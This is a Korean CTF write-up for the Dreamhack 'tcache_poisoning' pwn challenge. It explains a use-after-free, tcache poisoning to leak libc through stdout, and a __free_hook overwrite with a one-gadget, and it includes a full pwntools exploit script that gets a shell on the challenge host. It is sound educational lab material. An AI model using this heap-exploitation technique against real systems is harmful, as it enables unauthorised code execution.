---
ctf_name: "Dreamhack-Wargame"
challenge_name: "tcache_poisoning"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "medium"      # easy / medium / hard / insane
author: "khgkhg05"
date: "2026-08-11"
points:
tags: [ELF, x86-64, heap, tcache, tcache-poisoning, glibc-2.27, UAF]
---

# 문제명

`tcache_poisoning`

## 문제 설명

> Dreamhack `Exploit Tech: Tcache Poisoning`에서 실습하는 pwnable 문제이다.

- 문제 URL: `https://dreamhack.io/wargame/challenges/358/`
- 문제 파일: `tcache_poison`, `tcache_poison.c`, `flag`
- 실행 환경: Ubuntu 18.04, glibc 2.27
- 보호 기법: Full RELRO, No Canary, NX, No PIE

이 문제는 해제된 chunk를 계속 가리키는 포인터를 이용해 tcache entry를 조작하고, 원하는 주소를 `malloc()` 결과로 받아 쓰는 tcache poisoning 문제이다.

## 풀이

### 분석

프로그램은 하나의 `chunk` 포인터와 `size` 값을 전역 상태처럼 계속 재사용한다.

```c
void *chunk = NULL;
unsigned int size;
```

메뉴는 allocate, free, print, edit 네 가지 기능으로 구성되어 있다.

```c
case 1:
  printf("Size: ");
  scanf("%d", &size);

  chunk = malloc(size);

  printf("Content: ");
  read(0, chunk, size - 1);
  break;

case 2:
  free(chunk);
  break;

case 3:
  printf("Content: %s", chunk);
  break;

case 4:
  printf("Edit chunk: ");
  read(0, chunk, size - 1);
  break;
```

`free(chunk)` 이후에도 `chunk`가 `NULL`로 초기화되지 않는다. 따라서 이미 해제된 chunk를 `edit()`으로 수정하거나 `print()`로 출력할 수 있다.

보호 기법은 다음과 같다.

```text
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Full RELRO 때문에 GOT overwrite는 사용할 수 없고, No PIE이므로 바이너리의 `stdout` copy relocation 주소는 고정이다. exploit에서는 먼저 `stdout`에 저장된 libc 포인터를 leak해 libc base를 구한 뒤, `__free_hook`을 one-gadget 주소로 덮는다.

### 취약점

핵심 취약점은 Use After Free이다.

```c
free(chunk);
```

해제 후 포인터가 유지되기 때문에 freed chunk의 user data를 다시 쓸 수 있다. tcache에 들어간 chunk의 user data 영역은 tcache linked list의 metadata로 사용되므로, `edit()`을 이용하면 다음에 할당될 chunk 주소를 조작할 수 있다.

첫 번째 단계에서는 `0x30` 크기 할당을 사용한다. 실제 chunk size는 `0x40`이고, 이 크기의 tcache bin을 오염시킨다.

```python
alloc(0x30, b'dreamhack')
free()

edit(b'B'*8 + b'\x00')
free()
```

첫 번째 `free()` 이후 `edit()`으로 freed chunk의 metadata 일부를 바꾼 뒤 다시 `free()`한다. 이렇게 같은 chunk가 tcache bin에 중복으로 들어가면, 이후 할당에서 같은 chunk를 여러 번 받을 수 있고 tcache `next` 포인터를 원하는 주소로 바꿀 수 있다.

첫 번째 poisoning 대상은 바이너리의 `stdout` symbol이다.

```python
addr_stdout = e.symbols['stdout']
alloc(0x30, p64(addr_stdout))
alloc(0x30, b'BBBBBBBB')
```

이후 한 번 더 `alloc()`하면 `malloc()`이 `stdout` 주소를 chunk처럼 반환한다. `stdout`에는 libc 내부의 `_IO_2_1_stdout_` 주소가 들어 있으므로, `print_chunk()`에서 이 값을 문자열처럼 출력시켜 libc 주소를 leak할 수 있다.

```python
_io_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1]
alloc(0x30, _io_2_1_stdout_lsb)

print_chunk()
p.recvuntil(b'Content: ')
stdout = u64(p.recv(6).ljust(8, b'\x00'))
```

`alloc()`은 데이터를 입력해야 하므로 `_IO_2_1_stdout_` offset의 하위 1바이트만 다시 써서 `stdout` 포인터를 깨지 않도록 했다. leak된 값에서 `_IO_2_1_stdout_` offset을 빼면 libc base가 나온다.

```python
lb = stdout - libc.symbols['_IO_2_1_stdout_']
fh = lb + libc.symbols['__free_hook']
og = lb + 0x4f432
```

glibc 2.27 기준으로 사용한 주요 offset은 다음과 같다.

```text
_IO_2_1_stdout_ = 0x3ec760
__free_hook     = 0x3ed8e8
one_gadget      = 0x4f432
```

### 익스플로잇

두 번째 단계에서는 `0x40` 크기 할당을 사용한다. 실제 chunk size는 `0x50`이고, 같은 방식으로 tcache poisoning을 한 뒤 `__free_hook` 주소를 `malloc()` 결과로 받는다.

```python
alloc(0x40, b'dreamhack')
free()

edit(b'C'*8 + b'\x00')
free()

alloc(0x40, p64(fh))
alloc(0x40, b'D'*8)
alloc(0x40, p64(og))
```

마지막 `alloc()`은 `__free_hook`에 one-gadget 주소를 쓴다. 그 뒤 `free()`를 호출하면 glibc가 `__free_hook`을 통해 one-gadget을 실행한다.

전체 exploit 코드는 다음과 같다.

```python
from pwn import *

p = remote("host3.dreamhack.games", 9956)
e = ELF('./tcache_poison')
libc = ELF('./libc-2.27.so')

def alloc(size, data):
	p.sendlineafter(b'Edit\n', b'1')
	p.sendlineafter(b':', str(size).encode())
	p.sendafter(b':', data)

def free():
	p.sendlineafter(b'Edit\n', b'2')

def print_chunk():
	p.sendlineafter(b'Edit\n', b'3')

def edit(data):
	p.sendlineafter(b'Edit\n', b'4')
	p.sendafter(b':', data)

alloc(0x30, b'dreamhack')
free()

edit(b'B'*8 + b'\x00')
free()

addr_stdout = e.symbols['stdout']
alloc(0x30, p64(addr_stdout))

alloc(0x30, b'BBBBBBBB')

_io_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1]
alloc(0x30, _io_2_1_stdout_lsb)

print_chunk()
p.recvuntil(b'Content: ')
stdout = u64(p.recv(6).ljust(8, b'\x00'))
lb = stdout - libc.symbols['_IO_2_1_stdout_']
fh = lb + libc.symbols['__free_hook']
og = lb + 0x4f432

alloc(0x40, b'dreamhack')
free()

edit(b'C'*8 + b'\x00')
free()

alloc(0x40, p64(fh))
alloc(0x40, b'D'*8)

alloc(0x40, p64(og))

free()

p.interactive()
```

실행하면 Dreamhack에서 발급된 인스턴스에 연결한 뒤 interactive shell을 획득할 수 있다.

```text
$ python3 exploit.py
[*] Switching to interactive mode
$ cat flag
DH{REDACTED}
```

## 플래그

```text
DH{REDACTED}
```

## 배운 점

해제된 chunk를 계속 편집할 수 있으면 tcache linked list의 `next` 포인터를 조작해 `malloc()`이 원하는 주소를 반환하도록 만들 수 있다. 또한 Full RELRO 환경에서는 GOT overwrite가 막히므로, libc leak 이후 `__free_hook`과 같은 libc hook을 덮는 방식으로 실행 흐름을 장악할 수 있다.
